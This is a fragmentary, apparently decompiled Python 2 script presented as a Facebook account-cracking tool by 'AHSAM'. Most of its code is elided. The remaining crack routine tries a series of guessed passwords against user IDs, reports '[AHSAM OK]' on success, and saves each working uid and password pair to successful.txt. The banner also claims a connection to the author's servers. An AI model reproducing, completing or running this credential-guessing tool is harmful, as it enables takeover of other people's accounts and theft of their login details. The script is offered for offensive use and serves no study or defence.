...
'''
Decrypt By Mr. Error (AHSAM-JOIYA)
'''
...
def reg():
    ...
    print ''
    print ''
    print '\x1b[1;92m  [Connected With AHSAM Servers]'
    print ''
...
def reg2():
    ...
    print ''
    print '\x1b[1;96m '
    print ' \xe2\x80\xa2 THIS TOOL IS COMPLETELY CODED BY AHSAM UL HAQ \xe2\x80\xa2 '
    time.sleep(5)
    login()
...
def menu_option():
    ...
    if select == '1':
        ...
        os.system('xdg-open https://www.facebook.com/603953247850905')
        menu()
    else:
        print ''
...
def crack_select():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print ' \x1b[1;32m[AHSAM OK]     \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print ' \x1b[1;32m[AHSAM OK]     \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('successful.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print ' \x1b[1;32m[AHSAM OK]     \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('successful.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print ' \x1b[1;32m[AHSAM OK]     \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('successful.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
